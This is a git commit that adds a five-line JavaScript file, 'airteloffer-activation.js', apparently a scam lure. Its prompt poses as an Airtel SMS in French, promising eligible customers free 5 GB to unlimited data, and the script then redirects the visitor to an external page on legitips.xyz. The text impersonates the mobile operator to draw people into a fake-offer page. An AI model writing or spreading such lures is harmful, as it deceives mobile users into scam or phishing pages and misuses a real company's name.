e5633313f346103751e79970a91761b19653e776
legitips <83867893+legitips@users.noreply.github.com>
2024-06-17 15:21:06 -0700

    Create airteloffer-activation.js

---
+++ airteloffer-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('SMS AIRTEL : Cher client, veuillez vérifier si votre carte SIM AIRTEL est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/airteloffer.html';
+}
